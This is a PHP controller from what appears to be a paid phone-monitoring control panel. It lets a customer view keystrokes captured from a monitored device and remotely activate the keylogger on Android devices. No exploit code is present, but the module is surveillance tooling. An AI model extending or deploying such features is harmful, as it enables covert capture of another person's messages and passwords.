<?php

namespace Controllers;

use Models\Modules,
    CS\Devices\Limitations,
    System\FlashMessages;

class Keylogger extends BaseModuleController
{

    protected $module = Modules::KEYLOGGER;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {   
        if ($this->view->paid 
                && $this->di['currentDevice']['os'] === 'android' 
                    && $this->di['currentDevice']['app_version'] >= 11) {
            return $this->withActivation();
        }

        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
        $settingsModel = new \Models\Cp\Settings($this->di);
        $settings = $settingsModel->getDeviceSettings($this->di['devId']);
            
        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            $data = $keyloggerModel->getDataTableData(
                    $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
            );
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        if ($this->view->paid) {
            if(!$keyloggerModel->hasRecords($this->di['devId']) 
                    && isset($settings['keylogger_enabled']) && !$settings['keylogger_enabled']
                    && $this->di['currentDevice']['os'] !== 'ios') {
                return $this->setView('cp/keylogger/activation.htm');
            }
            $this->view->serviceKeylogger = $settings['keylogger_enabled'];
            $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
        }

        $this->setView('cp/keylogger/index.htm');
    }

    private function withActivation()
    {
        
        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
        $settingsModel = new \Models\Cp\Settings($this->di);
        $settings = $settingsModel->getDeviceSettings($this->di['devId']);
        
        if ($this->getRequest()->hasGet('activate')) {
            $settingsModel->activateKeylogger($this->di['devId']);
            $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Keylogger activation command has been successfully sent! Command activation will take up to 20 min.'));
            $this->redirect($this->di['router']->getRouteUrl('keylogger'));
        }
        
        if ( ($settings['keylogger_enabled'] or !$settings['keylogger_enabled']) 
                and $keyloggerModel->hasRecords($this->di['devId'])) {
            
            if ($this->getRequest()->isAjax()) {
                $dataTableRequest = new \System\DataTableRequest($this->di);

                $data = $keyloggerModel->getDataTableData(
                        $this->di['devId'], $dataTableRequest->buildResult(array('timeFrom', 'timeTo'))
                );
                $this->checkDisplayLength($dataTableRequest->getDisplayLength());
                $this->makeJSONResponse($data);
            }
            
            if ($this->view->paid) {
                $this->view->serviceKeylogger = $settings['keylogger_enabled'];
                $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
            }

            $this->setView('cp/keylogger/index.htm');
            
        } else {
            if($settings['keylogger_enabled'] and !$keyloggerModel->hasRecords($this->di['devId'])) {
                $this->setView('cp/keylogger/index.htm');
            } else 
                $this->setView('cp/keylogger/activation.htm');
            
        }
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Keylogger');
    }

    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::KEYLOGGER);
    }

}
